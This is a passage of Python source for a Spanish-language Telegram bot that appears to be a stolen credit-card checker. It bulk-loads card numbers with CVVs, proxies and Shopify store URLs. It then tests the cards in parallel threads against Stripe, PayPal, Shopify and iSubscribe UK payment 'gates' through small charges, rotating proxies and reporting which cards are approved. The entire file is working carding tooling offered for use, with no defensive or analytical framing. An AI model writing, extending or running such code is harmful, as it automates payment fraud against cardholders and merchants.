    notificar_cada = 10
    max_hilos = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
        elif arg == '--hilos' and i+1 < len(texto):
            try:
                max_hilos = int(texto[i+1])
            except:
                pass
    
    task_id = f"msh_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""🛍️ VERIFICACIÓN MASIVA SHOPIFY (MODO RÁPIDO)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
🌐 Sitios: {len(sitios)}
⚡ Hilos en paralelo: {max_hilos}
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}
🧹 Sitios malos se eliminan automáticamente

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_shopify_rapido, 
                   args=(task_id, message.chat.id, delay, notificar_cada, max_hilos))
    thread.daemon = True
    thread.start()

def procesar_masivo_shopify_rapido(task_id, chat_id, delay, notificar_cada, max_hilos=10):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    sitios = obtener_sitios()
    total_tarjetas = len(cards)
    total_sitios = len(sitios)
    
    if total_tarjetas == 0 or total_sitios == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas o sitios suficientes")
        return
    
    msg = bot.send_message(chat_id, f"⚡ Iniciando verificación rápida Shopify con {max_hilos} hilos...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0, 'sitios_eliminados': 0}
    detalles = []
    start_time = time.time()
    
    # Cache de BINs
    bin_cache_local = {}
    sitios_a_eliminar = []
    
    # Función para procesar una tarjeta
    def procesar_tarjeta(card, sitio, proxy):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            return None
        
        bin_key = card[:6]
        if bin_key in bin_cache_local:
            bin_info = bin_cache_local[bin_key]
        else:
            bin_info = consultar_bin_con_cache(bin_key)
            bin_cache_local[bin_key] = bin_info
        
        resultado = verificar_api_autoshopify(card, sitio, proxy)
        
        if resultado:
            mensaje = resultado.get('message', '').lower()
            respuestas_muertas = ['py id empty', '404', 'not found', 'connection refused', 'r4 token empty', 'token empty']
            
            es_muerto = any(rm in mensaje for rm in respuestas_muertas)
            
            if es_muerto:
                return ('eliminar_sitio', sitio, card, resultado)
            else:
                guardar_historial(card, resultado['proxy'], f"Shopify ${resultado['amount']}", 
                                resultado['amount'], resultado['status'], 
                                resultado['message'], resultado['gates'], bin_info)
                actualizar_estadisticas_sitio(sitio, resultado['success'])
                
                if resultado['status'] == 'success':
                    return ('success', card, resultado['message'][:50])
                elif resultado['status'] == 'failed':
                    return ('failed', card, resultado['message'][:50])
                else:
                    return ('error', card, resultado['message'][:50])
        return ('error', card, 'Sin resultado')
    
    # Preparar trabajos
    trabajos = []
    proxy_index_local = 0
    proxies = obtener_proxies()
    total_proxies = len(proxies)
    
    for i, card in enumerate(cards):
        sitio = sitios[i % total_sitios]
        if total_proxies > 0:
            proxy = proxies[proxy_index_local % total_proxies]
            proxy_index_local += 1
        else:
            proxy = None
        trabajos.append((card, sitio, proxy))
    
    # Procesar en paralelo
    with ThreadPoolExecutor(max_workers=max_hilos) as executor:
        futures = {executor.submit(procesar_tarjeta, card, sitio, proxy): idx 
                   for idx, (card, sitio, proxy) in enumerate(trabajos)}
        
        procesados = 0
        for future in as_completed(futures):
            if task_id in active_tasks and active_tasks[task_id].get('cancel'):
                break
            
            try:
                resultado = future.result(timeout=30)
                procesados += 1
                
                if resultado:
                    if resultado[0] == 'eliminar_sitio':
                        sitio = resultado[1]
                        card = resultado[2]
                        if sitio not in sitios_a_eliminar:
                            sitios_a_eliminar.append(sitio)
                            resultados['sitios_eliminados'] += 1
                            print(f"🗑️ Sitio marcado para eliminar: {sitio}")
                        resultados['error'] += 1
                        detalles.append(f"⚠️ {card} | Sitio eliminado")
                    elif resultado[0] == 'success':
                        resultados['success'] += 1
                        detalles.append(f"✅ {resultado[1]} | {resultado[2][:30]}")
                    elif resultado[0] == 'failed':
                        resultados['failed'] += 1
                        detalles.append(f"❌ {resultado[1]} | {resultado[2][:30]}")
                    else:
                        resultados['error'] += 1
                        detalles.append(f"⚠️ {resultado[1]} | {resultado[2][:30]}")
                
            except Exception as e:
                print(f"Error procesando: {e}")
                resultados['error'] += 1
            
            if procesados % notificar_cada == 0 or procesados == total_tarjetas:
                porcentaje = (procesados / total_tarjetas) * 100
                barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
                tiempo_transcurrido = time.time() - start_time
                velocidad = procesados / tiempo_transcurrido if tiempo_transcurrido > 0 else 0
                
                texto = f"""⚡ PROGRESO: {procesados}/{total_tarjetas} ({porcentaje:.1f}%)
{barra}
⚡ Velocidad: {velocidad:.1f} tarjetas/seg
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}"""
                
                try:
                    bot.edit_message_text(texto, chat_id, msg.message_id)
                except:
                    pass
    
    # Eliminar sitios muertos
    if sitios_a_eliminar:
        conn = get_db_connection()
        cursor = conn.cursor()
        for sitio in sitios_a_eliminar:
            cursor.execute("DELETE FROM sitios WHERE url = ?", (sitio,))
        conn.commit()
        conn.close()
        bot.send_message(chat_id, f"🗑️ Se eliminaron {len(sitios_a_eliminar)} sitios que no funcionan")
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    velocidad_final = total_tarjetas / tiempo_total if tiempo_total > 0 else 0
    
    filename = f"resultados_shopify_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN SHOPIFY (MODO RÁPIDO)\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total tarjetas: {total_tarjetas}\n")
        f.write(f"Sitios usados: {total_sitios}\n")
        f.write(f"Sitios eliminados: {resultados['sitios_eliminados']}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"Velocidad: {velocidad_final:.1f} tarjetas/seg\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles[:100]:  # Limitar detalles en archivo
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN SHOPIFY COMPLETADA (MODO RÁPIDO)
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
🗑️ Sitios eliminados: {resultados['sitios_eliminados']}
⏱️ Tiempo: {minutos}m {segundos}s
⚡ Velocidad: {velocidad_final:.1f} tarjetas/seg

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"📊 Resultados Shopify Rápido - {total_tarjetas} tarjetas")
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA iSubscribe UK (VERSIÓN RÁPIDA) ====================

@bot.message_handler(commands=['muk'])
def cmd_mass_isubscribe_rapido(message):
    """Verificación masiva con iSubscribe UK - VERSIÓN RÁPIDA CON HILOS"""
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 0
    notificar_cada = 10
    max_hilos = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
        elif arg == '--hilos' and i+1 < len(texto):
            try:
                max_hilos = int(texto[i+1])
            except:
                pass
    
    task_id = f"muk_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""🇬🇧 VERIFICACIÓN MASIVA iSubscribe UK (MODO RÁPIDO)
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⚡ Hilos en paralelo: {max_hilos}
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}

/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_isubscribe_rapido, 
                   args=(task_id, message.chat.id, delay, notificar_cada, max_hilos))
    thread.daemon = True
    thread.start()

def procesar_masivo_isubscribe_rapido(task_id, chat_id, delay, notificar_cada, max_hilos=10):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, f"⚡ Iniciando verificación rápida iSubscribe UK con {max_hilos} hilos...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    # Cache de BINs
    bin_cache_local = {}
    
    # Función para procesar una tarjeta
    def procesar_tarjeta(card):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            return None
        
        bin_key = card[:6]
        if bin_key in bin_cache_local:
            bin_info = bin_cache_local[bin_key]
        else:
            bin_info = consultar_bin_con_cache(bin_key)
            bin_cache_local[bin_key] = bin_info
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_isubscribe(card, proxy)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'],
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            
            if resultado['status'] == 'success':
                return ('success', card, resultado['message'][:50])
            elif resultado['status'] == 'failed':
                return ('failed', card, resultado['message'][:50])
            else:
                return ('error', card, resultado['message'][:50])
        return ('error', card, 'Sin resultado')
    
    # Procesar en paralelo
    with ThreadPoolExecutor(max_workers=max_hilos) as executor:
        futures = {executor.submit(procesar_tarjeta, card): card for card in cards}
        
        procesados = 0
        for future in as_completed(futures):
            if task_id in active_tasks and active_tasks[task_id].get('cancel'):
                break
            
            try:
                resultado = future.result(timeout=30)
                procesados += 1
                
                if resultado:
                    if resultado[0] == 'success':
                        resultados['success'] += 1
                        detalles.append(f"✅ {resultado[1]} | {resultado[2][:30]}")
                    elif resultado[0] == 'failed':
                        resultados['failed'] += 1
                        detalles.append(f"❌ {resultado[1]} | {resultado[2][:30]}")
                    else:
                        resultados['error'] += 1
                        detalles.append(f"⚠️ {resultado[1]} | {resultado[2][:30]}")
                
            except Exception as e:
                print(f"Error procesando: {e}")
                resultados['error'] += 1
            
            if procesados % notificar_cada == 0 or procesados == total:
                porcentaje = (procesados / total) * 100
                barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
                tiempo_transcurrido = time.time() - start_time
                velocidad = procesados / tiempo_transcurrido if tiempo_transcurrido > 0 else 0
                
                texto = f"""⚡ PROGRESO: {procesados}/{total} ({porcentaje:.1f}%)
{barra}
⚡ Velocidad: {velocidad:.1f} tarjetas/seg
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
                
                try:
                    bot.edit_message_text(texto, chat_id, msg.message_id)
                except:
                    pass
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    velocidad_final = total / tiempo_total if tiempo_total > 0 else 0
    
    filename = f"resultados_isubscribe_{task_id}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS VERIFICACIÓN iSubscribe UK (MODO RÁPIDO)\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n")
        f.write(f"Velocidad: {velocidad_final:.1f} tarjetas/seg\n")
        f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        f.write(f"━━━━ DETALLES ━━━━━━━━━━━━━━\n\n")
        for d in detalles[:100]:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN iSubscribe UK COMPLETADA (MODO RÁPIDO)
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s
⚡ Velocidad: {velocidad_final:.1f} tarjetas/seg

📁 Se generó archivo con detalles"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f, caption=f"🇬🇧 Resultados iSubscribe UK Rápido - {total} tarjetas")
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== OTROS COMANDOS ====================

@bot.message_handler(commands=['proxy'])
def cmd_proxy(message):
    global proxy_actual
    try:
        proxy = message.text.split()[1]
        proxy_actual = proxy
        bot.reply_to(message, f"✅ Proxy configurado manualmente: {proxy}")
    except:
        bot.reply_to(message, "❌ Uso: /proxy ip:puerto o ip:puerto:user:pass")

@bot.message_handler(commands=['stats'])
def cmd_stats(message):
    stats = obtener_estadisticas()
    texto = f"""
📊 ESTADÍSTICAS GLOBALES
━━━━━━━━━━━━━━━━━━━━━━
🌐 PROXIES: {stats['proxies']} | ✅ {stats['exits_proxy']} | ❌ {stats['fallos_proxy']}
🛍️ SITIOS: {stats['sitios']} | ✅ {stats['exits_sitio']} | ❌ {stats['fallos_sitio']}
💳 TARJETAS: {stats['tarjetas']}
📝 VERIFICACIONES: {stats['checks']} | ✅ {stats['aprobadas']}
━━━━━━━━━━━━━━━━━━━━━━"""
    bot.send_message(message.chat.id, texto)

@bot.message_handler(commands=['bin'])
def cmd_bin(message):
    try:
        bin_num = message.text.split()[1][:6]
        info = consultar_bin_con_cache(bin_num)
        
        texto = f"""
🔍 INFORMACION DEL BIN {bin_num}
━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 Banco: {info.get('bank', 'N/A')}
💳 Marca: {info.get('scheme', 'N/A')}
🌍 País: {info.get('country', 'N/A')} {info.get('country_emoji', '🌍')}
📋 Tipo: {info.get('type', 'N/A')}
━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        bot.reply_to(message, texto)
    except:
        bot.reply_to(message, "❌ Uso: /bin 123456")

@bot.message_handler(func=lambda m: m.text and m.text.startswith('/cancelar_'))
def cancelar_tarea(message):
    task_id = message.text.replace('/cancelar_', '')
    if task_id in active_tasks:
        active_tasks[task_id]['cancel'] = True
        bot.reply_to(message, f"🛑 Cancelando tarea {task_id}...")
    else:
        bot.reply_to(message, f"❌ Tarea no encontrada")

# ==================== MANEJO DE ARCHIVOS ====================

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Solo acepto archivos .txt")
        return
    
    msg = bot.reply_to(message, "📦 Procesando archivo...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        contenido = downloaded_file.decode('utf-8')
        
        # Extraer URLs
        urls = extraer_urls_de_texto(contenido)
        
        # Extraer proxies
        proxies = extraer_proxies_de_texto(contenido)
        
        # Extraer tarjetas (TODAS, sin límite)
        tarjetas = extraer_tarjetas_de_texto(contenido)
        
        if tarjetas and len(tarjetas) > 0:
            guardadas, repetidas = guardar_tarjetas_desde_lista(tarjetas)
            texto = f"""✅ TARJETAS CARGADAS
━━━━━━━━━━━━━━━━━━━━━━
📦 Guardadas: {guardadas}
🔁 Repetidas: {repetidas}
❌ Inválidas: {len(tarjetas) - guardadas - repetidas}"""
            bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
        elif proxies and len(proxies) > 0:
            guardados = 0
            repetidos = 0
            
            conn = get_db_connection()
            cursor = conn.cursor()
            for proxy in proxies:
                try:
                    cursor.execute("INSERT INTO proxies (proxy, fecha) VALUES (?, ?)",
                                  (proxy, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                    conn.commit()
                    guardados += 1
                except:
                    repetidos += 1
            conn.close()
            
            texto = f"""✅ PROXIES CARGADOS
━━━━━━━━━━━━━━━━━━━━━━
📦 Guardados: {guardados}
🔁 Repetidos: {repetidos}
❌ Inválidos: {len(proxies) - guardados - repetidos}"""
            bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
        elif urls and len(urls) > 0:
            guardados = 0
            repetidos = 0
            for url in urls:
                if guardar_sitio(url):
                    guardados += 1
                else:
                    repetidos += 1
            
            texto = f"""✅ SITIOS CARGADOS
━━━━━━━━━━━━━━━━━━━━━━
📦 Guardados: {guardados}
🔁 Repetidos: {repetidos}
🌐 Total URLs encontradas: {len(urls)}

Los sitios se verificarán automáticamente
y se eliminarán los que no funcionen.
🔄 Se usarán en rotación con /sh y /msh"""
            bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
        else:
            texto = "❌ No se pudo identificar el tipo de archivo.\n\nFormatos válidos:\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto o ip:puerto:user:pass\n🛍️ Sitios: cualquier URL (https://...)"
            bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(func=lambda m: True)
def default(message):
    bot.reply_to(message, "❓ Usa /menu para ver los comandos")

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == 'volver_principal':
        bot.edit_message_text("Selecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_principal())
    
    elif call.data == 'menu_tarjetas':
        bot.edit_message_text("💳 GESTIÓN DE TARJETAS\n\nSelecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_tarjetas())
    
    elif call.data == 'menu_proxies':
        bot.edit_message_text("🌐 GESTIÓN DE PROXIES\n\nSelecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_proxies())
    
    elif call.data == 'menu_paypal':
        bot.edit_message_text("💰 SELECCIONA GATE PAYPAL\n\nElige el monto:", call.message.chat.id, call.message.message_id, reply_markup=menu_paypal())
    
    elif call.data == 'menu_stripe_noavs':
        bot.send_message(call.message.chat.id, "💳 STRIPE $1 NO AVS\n\nUsa: /check5 NUMERO|MES|AÑO|CVV\n\nMasivo: /mass")
    
    elif call.data == 'menu_shopify':
        bot.edit_message_text("🛍️ GESTIÓN DE SITIOS\n\nSelecciona una opción:", call.message.chat.id, call.message.message_id, reply_markup=menu_shopify())
    
    elif call.data == 'menu_isubscribe':
        bot.send_message(call.message.chat.id, "🇬🇧 iSubscribe UK £4.00\n\nUsa: /uk NUMERO|MES|AÑO|CVV\n\nMasivo: /muk (MODO RÁPIDO)")
    
    elif call.data == 'paypal_10':
        bot.send_message(call.message.chat.id, "💰 PAYPAL $10.00\n\nUsa: /pp NUMERO|MES|AÑO|CVV")
    
    elif call.data == 'paypal_01':
        bot.send_message(call.message.chat.id, "🪙 PAYPAL $0.10\n\nUsa: /pp2 NUMERO|MES|AÑO|CVV")
    
    elif call.data == 'paypal_1':
        bot.send_message(call.message.chat.id, "💎 PAYPAL $1.00\n\nUsa: /pp3 NUMERO|MES|AÑO|CVV")
    
    elif call.data == 'shopify_individual':
        bot.send_message(call.message.chat.id, "🛍️ AUTOSHOPIFY\n\nUsa: /sh NUMERO|MES|AÑO|CVV\n\nOpcional: /sh CC URL")
    
    elif call.data == 'shopify_masivo':
        bot.send_message(call.message.chat.id, "📦 VERIFICACIÓN MASIVA SHOPIFY\n\nUsa: /msh (MODO RÁPIDO)\n\nOpciones: /msh --hilos 15 --notificar 20")
    
    elif call.data == 'add_sitio':
        msg = bot.send_message(call.message.chat.id, "➕ AÑADIR SITIO\n\nEnvía la URL del sitio:")
        bot.register_next_step_handler(msg, procesar_add_sitio)
    
    elif call.data == 'listar_sitios':
        cmd_listar_sitios(call.message)
    
    elif call.data == 'del_sitio':
        msg = bot.send_message(call.message.chat.id, "🗑️ ELIMINAR SITIO\n\nEnvía la URL del sitio a eliminar:")
        bot.register_next_step_handler(msg, procesar_del_sitio)
    
    elif call.data == 'del_all_sitios':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text("⚠️ ¿ESTÁS SEGURO?\n\nEsto eliminará TODOS los sitios guardados permanentemente.", call.message.chat.id, call.message.message_id, reply_markup=confirmacion)
    
    elif call.data == 'menu_stats':
        cmd_stats(call.message)
    
    elif call.data == 'menu_cargar':
        bot.send_message(call.message.chat.id, "📁 CARGAR ARCHIVO\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: cualquier URL\n\nEl bot detectará automáticamente qué es cada cosa.")
    
    elif call.data == 'listar_tarjetas':
        listar_tarjetas(call.message)
    
    elif call.data == 'listar_proxies':
        listar_proxies(call.message)
    
    elif call.data == 'add_proxy':
        msg = bot.send_message(call.message.chat.id, "➕ AÑADIR PROXY\n\nEnvía el proxy en formato ip:puerto:user:pass")
        bot.register_next_step_handler(msg, procesar_add_proxy)
    
    elif call.data == 'del_proxy':
        msg = bot.send_message(call.message.chat.id, "🗑️ ELIMINAR PROXY\n\nEnvía el proxy a eliminar:")
        bot.register_next_step_handler(msg, procesar_del_proxy)
    
    elif call.data == 'del_all_proxies':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_proxies')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_proxies')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text("⚠️ ¿ESTÁS SEGURO?\n\nEsto eliminará TODOS los proxies guardados permanentemente.", call.message.chat.id, call.message.message_id, reply_markup=confirmacion)
    
    elif call.data == 'confirm_del_all_proxies':
        cantidad = eliminar_todos_proxies()
        bot.edit_message_text(f"🗑️ Se eliminaron {cantidad} proxies", call.message.chat.id, call.message.message_id, reply_markup=menu_proxies())
    
    elif call.data == 'cancel_del_all_proxies':
        bot.edit_message_text("✅ Operación cancelada", call.message.chat.id, call.message.message_id, reply_markup=menu_proxies())
    
    elif call.data == 'confirm_del_all_sitios':
        cantidad = eliminar_todos_sitios()
        bot.edit_message_text(f"🗑️ Se eliminaron {cantidad} sitios", call.message.chat.id, call.message.message_id, reply_markup=menu_shopify())
    
    elif call.data == 'cancel_del_all_sitios':
        bot.edit_message_text("✅ Operación cancelada", call.message.chat.id, call.message.message_id, reply_markup=menu_shopify())
    
    elif call.data == 'test_proxies_fast':
        cmd_test_proxies_ultra_rapido(call.message)
    
    elif call.data == 'clean_dead':
        eliminados = eliminar_proxies_muertos()
        bot.send_message(call.message.chat.id, f"🧹 Se eliminaron {eliminados} proxies muertos", reply_markup=menu_proxies())
    
    elif call.data == 'export_proxies':
        cmd_export_proxies(call.message)
    
    elif call.data == 'clean_sites':
        try:
            eliminados = limpiar_sitios_muertos()
            restantes = len(obtener_sitios())
            bot.send_message(call.message.chat.id, f"🧹 LIMPIEZA COMPLETADA\n🗑️ Sitios eliminados: {eliminados}\n📌 Sitios restantes: {restantes}")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
    
    elif call.data == 'eliminar_tarjeta':
        msg = bot.send_message(call.message.chat.id, "🗑️ ELIMINAR TARJETA\n\nEnvía la tarjeta a eliminar:")
        bot.register_next_step_handler(msg, procesar_del_tarjeta)
    
    elif call.data == 'limpiar_tarjetas':
        confirmacion = types.InlineKeyboardMarkup()
        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todas", callback_data='confirm_limpiar_tarjetas')
        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_limpiar_tarjetas')
        confirmacion.add(btn1, btn2)
        bot.edit_message_text("⚠️ ¿ESTÁS SEGURO?\n\nEsto eliminará TODAS las tarjetas guardadas permanentemente.", call.message.chat.id, call.message.message_id, reply_markup=confirmacion)
    
    elif call.data == 'confirm_limpiar_tarjetas':
        cantidad = eliminar_todas_tarjetas()
        bot.edit_message_text(f"🗑️ Se eliminaron {cantidad} tarjetas", call.message.chat.id, call.message.message_id, reply_markup=menu_tarjetas())
    
    elif call.data == 'cancel_limpiar_tarjetas':
        bot.edit_message_text("✅ Operación cancelada", call.message.chat.id, call.message.message_id, reply_markup=menu_tarjetas())

# ==================== PROCESADORES ====================

def procesar_add_proxy(message):
    proxy = message.text.strip()
    if guardar_proxy(proxy):
        bot.reply_to(message, f"✅ Proxy guardado: {proxy}", reply_markup=menu_principal())
    else:
        bot.reply_to(message, "❌ Error: El proxy ya existe", reply_markup=menu_principal())

def procesar_del_proxy(message):
    proxy = message.text.strip()
    if eliminar_proxy(proxy):
        bot.reply_to(message, f"✅ Proxy eliminado: {proxy}", reply_markup=menu_principal())
    else:
        bot.reply_to(message, "❌ Proxy no encontrado", reply_markup=menu_principal())

def procesar_add_sitio(message):
    url = message.text.strip()
    if guardar_sitio(url):
        bot.reply_to(message, f"✅ Sitio guardado: {url}", reply_markup=menu_principal())
    else:
        bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida", reply_markup=menu_principal())

def procesar_del_sitio(message):
    url = message.text.strip()
    if eliminar_sitio(url):
        bot.reply_to(message, f"✅ Sitio eliminado: {url}", reply_markup=menu_principal())
    else:
        bot.reply_to(message, "❌ Sitio no encontrado", reply_markup=menu_principal())

def procesar_del_tarjeta(message):
    tarjeta = message.text.strip()
    if eliminar_tarjeta(tarjeta):
        bot.reply_to(message, f"✅ Tarjeta eliminada: {tarjeta}", reply_markup=menu_tarjetas())
    else:
        bot.reply_to(message, "❌ Tarjeta no encontrada", reply_markup=menu_tarjetas())

def listar_tarjetas(message):
    tarjetas = obtener_todas_tarjetas()
    if not tarjetas:
        bot.send_message(message.chat.id, "📭 No hay tarjetas guardadas", reply_markup=menu_principal())
        return
    
    texto = "💳 MIS TARJETAS\n━━━━━━━━━━━━━━\n"
    for cc, fecha, veces in tarjetas[:10]:
        texto += f"• {cc} [{veces} veces]\n"
    texto += f"\n📊 Total: {len(tarjetas)} tarjetas"
    bot.send_message(message.chat.id, texto, reply_markup=menu_tarjetas())

def listar_proxies(message):
    proxies = obtener_proxies_con_estadisticas()
    if not proxies:
        bot.send_message(message.chat.id, "📭 No hay proxies guardados", reply_markup=menu_principal())
        return
    
    texto = "🌐 MIS PROXIES\n━━━━━━━━━━━━━━\n"
    for proxy, succ, fail, last_test, status in proxies[:10]:
        emoji = "✅" if status == 'alive' else "🐢" if status == 'slow' else "❌" if status == 'dead' else "⏳"
        texto += f"{emoji} {proxy} | ✅{succ} ❌{fail}\n"
    bot.send_message(message.chat.id, texto, reply_markup=menu_proxies())

# ==================== INICIAR BOT ====================

if __name__ == "__main__":
    print("="*80)
    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON MODO RÁPIDO")
    print("="*80)
    print("✅ Gates disponibles:")
    print("   • Stripe $1 No AVS  → /check5")
    print("   • PayPal: $10/$0.10/$1 → /pp, /pp2, /pp3")
    print("   • AutoShopify       → /sh")
    print("   • iSubscribe UK £4  → /uk")
    print("="*80)
    print("✅ Comandos masivos:")
    print("   • Stripe masivo     → /mass")
    print("   • PayPal masivo     → /mpp")
    print("   • Shopify masivo    → /msh (MODO RÁPIDO)")
    print("   • iSubscribe masivo → /muk (MODO RÁPIDO)")
    print("="*80)
    print("✅ Mejoras de velocidad:")
    print("   • Hilos en paralelo (configurable con --hilos)")
    print("   • Cache de BINs")
    print("   • Delay reducido a 0")
    print("   • Velocidad en tiempo real")
    print("="*80)
    print("✅ Proxies:")
    print("   • /px - Test ULTRA RÁPIDO")
    print("   • /exportproxies - Exportar todos los proxies")
    print("="*80)
    print("✅ Sitios:")
    print("   • /addsh, /sitios, /delsh, /cleansites")
    print("   • Limpieza automática de sitios que no funcionan")
    print("="*80)
    print("📱 Usa /menu para comenzar")
    print("="*80)
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"❌ Error en polling: {e}")
            time.sleep(5)
